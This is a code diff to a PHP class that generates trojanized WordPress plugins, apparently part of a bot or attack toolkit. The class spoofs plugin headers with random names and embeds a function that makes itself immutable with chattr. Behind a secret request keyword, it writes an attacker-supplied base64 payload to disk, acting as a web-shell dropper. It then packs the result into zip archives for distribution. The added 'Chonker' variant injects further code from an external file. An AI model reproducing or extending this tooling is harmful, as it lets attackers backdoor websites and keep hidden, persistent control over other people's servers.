@@ -3,30 +3,30 @@
 namespace new_bots\wordpressPlugins;
 
 use Faker\Factory;
+use phpseclib3\Math\BigInteger\Engines\PHP;
 
 
 class makeMeWordPressing extends \ZipArchive
 {
 
     private \Faker\Generator $faker;
-    private string $activator;
+    protected string $activator;
     private string $spoof_directory_name;
+    private string $random_name;
 
-    function __construct(string | null $activator)
+    function __construct(string $activator)
     {
         $this->faker = Factory::create();
         $this->random_name = bin2hex(openssl_random_pseudo_bytes(24));
-        if (!is_null($activator)){
-            $this->activator = $activator;
-        } else {
-            echo "Due to the fact that you did not give me an activation keyword.".PHP_EOL."I will be setting the activation keyword to \033[0;31mCHANGEME\033[0m".PHP_EOL;
-            $this->activator = 'CHANGEME';
-        }
+        $this->activator = $activator;
         $this->spoof_directory_name = $this->faker->word();
         if (is_dir($this->spoof_directory_name)){
             rmdir($this->spoof_directory_name);
+            mkdir($this->spoof_directory_name);
         }
-        mkdir($this->spoof_directory_name);
+        if (!is_dir($this->spoof_directory_name)){
+            mkdir($this->spoof_directory_name);
+        }
     }
 
     protected function spoofWordPressHeader(): array
@@ -46,7 +46,50 @@ class makeMeWordPressing extends \ZipArchive
         ];
     }
 
-    public function createTrojanWordpress(): array
+    /**
+     * @throws \Exception
+     */
+    public function createChonker(): array {
+        $spoof = $this->spoofWordPressHeader();
+        $base = '';
+        $spoof_name = "{$this->spoof_directory_name}/{$this->random_name}.php";
+        echo $spoof_name.PHP_EOL;
+        foreach ($spoof as $key => $valu){
+            $base .= "* {$key} {$valu}\n";
+        }
+        $base .= "*/\n";
+        $slop = file('slop.php');
+        foreach (explode($base, "\n") as $baseline){
+            $alt = 1;
+            $slop[$alt] .= $baseline;
+            $alt += 1;
+        }
+        $slop[array_key_last($slop)-5] = '';
+        $slop[array_key_last($slop)-4] = '';
+        $slop[array_key_last($slop)-3] = '';
+        $slop[array_key_last($slop)-2] = '';
+        $slop[array_key_last($slop)-1] = '';
+        $slop[array_key_last($slop)] = PHP_EOL."add_action('init', slopp);".PHP_EOL;
+        $counter = 0;
+        foreach ($slop as $needer){
+            $counter += 1;
+            if (str_contains($needer, "main()") !== false){
+                echo "Overwriting: $needer".PHP_EOL;
+                $slop[$counter] = "function {$spoof['Plugin Name:']}(){".PHP_EOL;
+                echo $slop[$counter].PHP_EOL;
+            }
+        }
+        file_put_contents($spoof_name, implode("", $slop));
+        return [
+            "TrojanPlugin" => $this->packZipArchive($spoof_name, $spoof['Plugin Name:']),
+            "ActivationWord" => "Chonker-" . bin2hex(openssl_random_pseudo_bytes(10))
+        ];
+    }
+
+    /**
+     * @throws \Exception
+     */
+    public function createSmallTrojanWordpress(): array
     {
         $spoof = $this->spoofWordPressHeader();
         $base = "<?php\n/*\n";
@@ -59,6 +102,11 @@ $base
 function {$spoof['Plugin Name:']}(){
     @system("chattr +i ".\$_SERVER['SCRIPT_FILENAME']) || @system("chattr +i ". __FILE__);
     if (!is_file('$this->random_name.php')){
+        if (!is_writable('.')){
+            http_response_code(404);
+            echo "CRITICAL ERROR, I CANNOT WRITE TO THIS DIRECTORY! PANIC!";
+            die();
+        }
         if (isset(\$_REQUEST['{$this->activator}'])){
             file_put_contents('{$this->random_name}.php', base64_decode(\$_REQUEST['$this->activator']));
             header("FileName: {$this->random_name}.php");
@@ -74,17 +122,21 @@ add_action('init', {$spoof['Plugin Name:']});
 TPL;
         $tr_name = "{$this->spoof_directory_name}/{$this->random_name}.php";
         file_put_contents("{$this->spoof_directory_name}/{$this->random_name}.php", $template);
+        return [
+            "TrojanPlugin" => $this->packZipArchive($tr_name, $spoof['Plugin Name:']),
+            "ActivationWord" => $this->activator
+        ];
+    }
+
+    protected function packZipArchive(string $trojan_script, string $spoof_name): string {
         $zipper = new \ZipArchive();
-        if ($zipper->open("lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof['Plugin Name:']}.zip", \ZipArchive::CREATE) !== true){
+        if ($zipper->open("lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof_name}.zip", \ZipArchive::CREATE) !== true){
             throw new \Exception(PHP_EOL."\033[0;31m[ !! ] PANIC, I CANNOT WRITE THE ZIP ARCHIVE. [ !! ]\033[0m".PHP_EOL);
         }
         $zipper->addFile("{$this->spoof_directory_name}/{$this->random_name}.php");
         $zipper->close();
-        unlink($tr_name);
+        unlink($trojan_script);
         rmdir($this->spoof_directory_name);
-        return [
-            "TrojanPlugin" => "lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof['Plugin Name:']}.zip",
-            "ActivationWord" => $this->activator
-        ];
+        return "lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof_name}.zip";
     }
 }
